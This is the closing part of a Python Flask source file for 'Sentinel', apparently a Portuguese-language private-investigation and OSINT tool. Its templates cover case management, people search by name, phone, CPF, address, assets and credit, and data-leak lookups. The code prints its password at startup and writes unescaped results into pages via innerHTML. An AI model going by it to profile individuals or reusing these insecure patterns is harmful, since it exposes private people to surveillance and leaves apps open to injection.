            fetch('/api/monitor/status', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ativo: false })
            }).then(() => {
                atualizarStatus();
                setTimeout(() => location.reload(), 1500);
            });
        }
        
        function limparDados() {
            if (confirm('⚠️ LIMPAR TODOS OS DADOS DO MONITORAMENTO?')) {
                fetch('/api/monitor/limpar', { method: 'POST' }).then(() => location.reload());
            }
        }
        
        function limparCasos() {
            if (confirm('⚠️ REMOVER TODOS OS CASOS?')) {
                fetch('/api/limpar_casos', { method: 'POST' }).then(() => location.reload());
            }
        }
        
        setInterval(atualizarStatus, 5000);
    </script>
</body>
</html>
'''

NOVO_CASO_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sentinel - Novo Caso</title>
<style>body{background:#0a0e1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}.navbar{background:#050a12;border-bottom:2px solid #00ffcc;padding:12px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-radius:10px;flex-wrap:wrap;gap:10px}.logo{font-size:20px;color:#00ffcc}.btn{background:transparent;border:1px solid #00ffcc;padding:6px 14px;border-radius:20px;text-decoration:none;color:#00ffcc;font-size:12px}.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:20px;max-width:500px;margin:0 auto}h2{color:#00ffcc;margin-bottom:20px;font-size:18px}input,select,textarea{width:100%;padding:10px;margin:8px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#fff;font-size:14px}button{background:#00ffcc;border:none;padding:12px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%}@media (max-width:480px){.navbar{flex-direction:column}.card{padding:15px}}</style>
</head>
<body><div class="navbar"><div class="logo">🛡️ SENTINEL</div><a href="/painel" class="btn">← PAINEL</a></div>
<div class="card"><h2>➕ NOVO CASO</h2>
<form method="POST">
<select name="tipo" required><option value="">TIPO DE CASO...</option><option>Investigação de pessoa física</option><option>Investigação de pessoa jurídica</option><option>Localização patrimonial</option><option>Análise de crédito</option></select>
<input type="text" name="cliente" placeholder="NOME DO CLIENTE" required>
<input type="text" name="investigado" placeholder="NOME DO INVESTIGADO" required>
<textarea name="objetivo" rows="3" placeholder="OBJETIVO DA INVESTIGAÇÃO" required></textarea>
<textarea name="notas" rows="3" placeholder="NOTAS INICIAIS (OPCIONAL)"></textarea>
<button type="submit">🔍 INICIAR INVESTIGAÇÃO</button>
</form>
</div>
</body>
</html>
'''

CASO_DETALHE_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sentinel - {{ caso.id }}</title>
<style>body{background:#0a0e1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}.navbar{background:#050a12;border-bottom:2px solid #00ffcc;padding:12px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-radius:10px;flex-wrap:wrap;gap:10px}.logo{font-size:20px;color:#00ffcc}.btn{background:transparent;border:1px solid #00ffcc;padding:6px 14px;border-radius:20px;text-decoration:none;color:#00ffcc;font-size:12px}.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:20px;margin-bottom:20px}.status{display:inline-block;padding:4px 10px;border-radius:20px;font-size:11px}.status-andamento{background:#ffaa00;color:#000}.status-concluido{background:#00cc66;color:#000}.etapa-card{background:rgba(0,0,0,0.3);border-left:3px solid #00ffcc;padding:12px;margin-bottom:10px;border-radius:8px}input,textarea,select{width:100%;padding:10px;margin:8px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#fff}button{background:#00ffcc;border:none;padding:12px;border-radius:8px;font-weight:bold;cursor:pointer}.badge{background:rgba(0,136,255,0.3);padding:3px 8px;border-radius:12px;font-size:10px}@media (max-width:480px){.navbar{flex-direction:column}}</style>
</head>
<body><div class="navbar"><div class="logo">🛡️ SENTINEL</div><a href="/painel" class="btn">← PAINEL</a></div>
<div class="card"><h2>{{ caso.investigado }}</h2><p><span class="badge">{{ caso.id }}</span> • {{ caso.criado_em }}</p><p><strong>CLIENTE:</strong> {{ caso.cliente }}</p><p><strong>TIPO:</strong> {{ caso.tipo }}</p><p><strong>STATUS:</strong> <span class="status status-{{ 'andamento' if caso.status == 'Em andamento' else 'concluido' }}">{{ caso.status }}</span></p><p><strong>OBJETIVO:</strong> {{ caso.objetivo }}</p>{% if caso.notas %}<p><strong>NOTAS:</strong> {{ caso.notas }}</p>{% endif %}</div>
<div class="card"><h3>📋 ETAPAS</h3>{% for e in caso.etapas %}<div class="etapa-card"><strong>ETAPA {{ e.num }}: {{ e.titulo }}</strong><div><span class="badge">{{ e.tipo }}</span> • {{ e.ts }}</div><p style="margin-top:8px">{{ e.dados }}</p></div>{% else %}<p>NENHUMA ETAPA REGISTRADA.</p>{% endfor %}</div>
<div class="card"><h3>➕ ADICIONAR ETAPA</h3><input type="text" id="titulo" placeholder="TÍTULO"><select id="tipo"><option>Identificação Cadastral</option><option>Análise Digital (OSINT)</option><option>Estrutura Patrimonial</option><option>Vínculos e Relacionamentos</option><option>Conclusão Investigativa</option></select><textarea id="dados" rows="4" placeholder="DADOS E ANÁLISE..."></textarea><button onclick="adicionarEtapa()">➕ SALVAR ETAPA</button></div>
<script>const CASO_ID = "{{ caso.id }}";async function adicionarEtapa(){const t=document.getElementById('titulo').value,ti=document.getElementById('tipo').value,d=document.getElementById('dados').value;if(!t||!d){alert('Preencha título e dados');return}const r=await fetch(`/api/caso/${CASO_ID}/etapa`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({titulo:t,tipo:ti,dados:d})});if((await r.json()).ok)location.reload()}</script>
</body>
</html>
'''

OSINT_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sentinel - OSINT</title>
<style>body{background:#0a0e1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}.navbar{background:#050a12;border-bottom:2px solid #00ffcc;padding:12px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-radius:10px;flex-wrap:wrap;gap:10px}.logo{font-size:20px;color:#00ffcc}.btn{background:transparent;border:1px solid #00ffcc;padding:6px 14px;border-radius:20px;text-decoration:none;color:#00ffcc;font-size:12px}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:15px}.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:18px}.card h2{color:#00ffcc;margin-bottom:12px;font-size:16px;border-left:3px solid #00ffcc;padding-left:10px}input{width:100%;padding:10px;margin:8px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#fff;font-size:14px}button{background:#00ffcc;border:none;padding:10px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%}.resultado-card{background:rgba(0,0,0,0.3);border-left:2px solid #00ffcc;padding:10px;margin-bottom:8px;border-radius:8px}.resultado-card a{color:#00ffcc;text-decoration:none;word-break:break-all}.categoria-titulo{color:#ffaa44;margin:12px 0 6px;font-size:13px}@media (max-width:480px){.navbar{flex-direction:column}.grid{grid-template-columns:1fr}}</style>
</head>
<body><div class="navbar"><div class="logo">🛡️ SENTINEL OSINT</div><div><a href="/painel" class="btn">← PAINEL</a></div></div>
<div class="grid">
<div class="card"><h2>🌐 REDES SOCIAIS</h2><input type="text" id="rede_nome" placeholder="Nome completo"><input type="text" id="rede_username" placeholder="Username"><input type="email" id="rede_email" placeholder="Email"><input type="tel" id="rede_telefone" placeholder="Telefone"><button onclick="buscarRedes()">🔍 BUSCAR</button><div id="rede_resultados"></div></div>
<div class="card"><h2>🏠 BENS</h2><input type="text" id="bens_cpf" placeholder="CPF/CNPJ"><button onclick="buscarBens()">🔍 BUSCAR</button><div id="bens_resultados"></div></div>
<div class="card"><h2>📍 LOCALIZAÇÃO</h2><input type="text" id="local_endereco" placeholder="Endereço"><input type="text" id="local_cep" placeholder="CEP"><input type="text" id="local_cidade" placeholder="Cidade"><button onclick="buscarLocalizacao()">🗺️ LOCALIZAR</button><div id="local_resultados"></div></div>
<div class="card"><h2>📊 CRÉDITO</h2><input type="text" id="credito_cpf" placeholder="CPF"><button onclick="buscarCredito()">📊 ANALISAR</button><div id="credito_resultados"></div></div>
<div class="card"><h2>🔓 VAZAMENTOS</h2><input type="email" id="vazado_email" placeholder="Email"><button onclick="buscarVazamentos()">🔍 VERIFICAR</button><div id="vazado_resultados"></div></div>
</div>
<script>
async function buscarRedes(){const n=document.getElementById('rede_nome').value,u=document.getElementById('rede_username').value,e=document.getElementById('rede_email').value,t=document.getElementById('rede_telefone').value;if(!n&&!u&&!e&&!t){alert('Digite algo');return;}const r=await fetch('/osint/redes',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nome:n,username:u,email:e,telefone:t})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria;}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`;});document.getElementById('rede_resultados').innerHTML=h;}
async function buscarBens(){const c=document.getElementById('bens_cpf').value;if(!c){alert('Digite CPF/CNPJ');return;}const r=await fetch('/osint/bens',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cpf_cnpj:c})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria;}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`;});document.getElementById('bens_resultados').innerHTML=h;}
async function buscarLocalizacao(){const e=document.getElementById('local_endereco').value,c=document.getElementById('local_cep').value,ci=document.getElementById('local_cidade').value;if(!e&&!c){alert('Digite endereço ou CEP');return;}const r=await fetch('/osint/localizacao',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({endereco:e,cep:c,cidade:ci})});const d=await r.json();document.getElementById('local_resultados').innerHTML=`<div class="resultado-card"><strong>🗺️ MAPS</strong><br><a href="${d.maps_url}" target="_blank">Abrir mapa</a></div><div class="resultado-card"><strong>🚗 WAZE</strong><br><a href="${d.waze_url}" target="_blank">Abrir Waze</a></div>`;}
async function buscarCredito(){const c=document.getElementById('credito_cpf').value;if(!c){alert('Digite CPF');return;}const r=await fetch('/osint/credito',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cpf:c})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria;}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`;});document.getElementById('credito_resultados').innerHTML=h;}
async function buscarVazamentos(){const e=document.getElementById('vazado_email').value;if(!e){alert('Digite email');return;}const r=await fetch('/osint/vazamentos',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:e})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria;}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`;});document.getElementById('vazado_resultados').innerHTML=h;}
</script>
</body>
</html>
'''

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    print("=" * 60)
    print("🛡️ SENTINEL MONITOR - SISTEMA COMPLETO")
    print("=" * 60)
    print(f"🔐 Senha: {SISTEMA_SENHA}")
    print(f"📱 Acesse: http://localhost:5000")
    print("=" * 60)
    print("✅ DESIGN RESPONSIVO (Celular/PC)")
    print("✅ ESTILO FBI MODERNO")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=False)